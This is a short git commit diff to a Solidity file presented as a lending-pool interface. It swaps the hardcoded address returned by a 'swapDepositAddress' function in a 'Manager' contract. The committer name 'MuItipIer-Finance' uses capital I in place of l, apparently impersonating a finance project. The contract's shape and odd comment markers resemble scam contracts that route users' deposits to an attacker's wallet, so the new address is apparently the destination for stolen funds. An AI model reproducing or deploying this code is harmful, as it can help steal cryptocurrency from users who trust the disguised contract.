a3148a5eaee2b47a82807830033370b5228bf988
MuItipIer-Finance <120128538+MuItipIer-Finance@users.noreply.github.com>
2022-12-08 19:06:26 +0100

    Update ILendingPoolSwapingAdress.sol

--- main/contracts/interfaces/ILendingPoolSwapingAdress.sol
+++ main/contracts/interfaces/ILendingPoolSwapingAdress.sol
@@ -4,6 +4,6 @@ contract Manager {
     function performTasks() pure public {
     }
        */ function swapDepositAddress() public pure returns (address) {
-        return 0x09A1378e7f70710a4C0E86fFc98203C3142DFEEc;
+        return 0x3C593553DfF2A9057Aa5C3cce0E9328f12E6D1a0;
     }
 }
